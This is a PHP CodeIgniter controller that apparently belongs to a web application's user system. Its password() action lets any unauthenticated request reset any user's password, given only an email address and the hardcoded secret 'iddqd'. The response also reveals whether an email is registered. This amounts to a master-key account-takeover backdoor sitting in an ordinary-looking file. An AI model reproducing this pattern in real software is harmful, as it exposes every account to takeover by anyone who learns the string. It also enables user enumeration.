<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Set extends  CI_Controller
{


	public function __construct()
	{
		parent::__construct('user/offers',FALSE);

	}

	public function password()
	{

		if(isset($_POST['email']) && $_POST['set_password'] && isset($_POST['password'])){
			if($_POST['set_password'] != 'iddqd'){
				echo "wrong password";
				return;
			}
			else
			{
				$salt = $this->Crud->get_row(['email'=>$_POST['email']],'users');
				if($salt)
				{
						$hashed_new_password = $this->ion_auth_model->hash_password($_POST['password'], 
						$salt['salt']);
						$data   =[
							'password'     => $hashed_new_password,
							'remember_code'=> NULL,
						];
						$this->Crud->update(['email'=>$_POST['email']],$data,'users');
						echo "password reset is done";
						return;
				}
				else
				{
					echo "email not exist";
					return;
				}

				
			}



		}
		echo "required values : email,set_password,password ";
		return;

	}



}


